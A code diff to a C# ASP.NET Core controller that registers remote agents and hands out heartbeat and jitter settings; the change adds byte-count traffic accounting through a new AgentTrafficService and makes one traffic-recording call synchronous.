@@ -1,3 +1,5 @@
+using System.Text;
+using System.Text.Json;
 using Microsoft.AspNetCore.Mvc;
 using LibraNextgen.Service.Services;
 
@@ -8,10 +10,12 @@ namespace LibraNextgen.Service.Controllers;
 public class AgentCommsController : ControllerBase
 {
     private readonly AgentCommsService _commsService;
+    private readonly AgentTrafficService _traffic;
 
-    public AgentCommsController(AgentCommsService commsService)
+    public AgentCommsController(AgentCommsService commsService, AgentTrafficService traffic)
     {
         _commsService = commsService;
+        _traffic = traffic;
     }
 
     [HttpPost("register")]
@@ -19,6 +23,8 @@ public class AgentCommsController : ControllerBase
     {
         if (string.IsNullOrWhiteSpace(request.Hostname))
             return BadRequest(new { error = "hostname required" });
+
+        var bytesReceived = Request.ContentLength ?? 0;
 
         var clientIp = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
         var agent = await _commsService.HandleRegisterAsync(request, clientIp);
@@ -36,6 +42,10 @@ public class AgentCommsController : ControllerBase
             heartbeat_interval = profile.HeartbeatIntervalSeconds,
             jitter = profile.JitterPercent
         };
+
+        var responseJson = JsonSerializer.Serialize(response);
+        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
+        _traffic.Accumulate(agent.Id, agent.Hostname, bytesReceived, bytesSent);
 
         return Ok(response);
     }
@@ -56,7 +66,7 @@ public class AgentCommsController : ControllerBase
         var responseJson = System.Text.Json.JsonSerializer.Serialize(response);
         var bytesSent = System.Text.Encoding.UTF8.GetByteCount(responseJson);
 
-        await _commsService.RecordTrafficAsync(agentId, hostname, bytesReceived, bytesSent);
+        _commsService.RecordTraffic(agentId, hostname, bytesReceived, bytesSent);
 
         return Ok(response);
     }
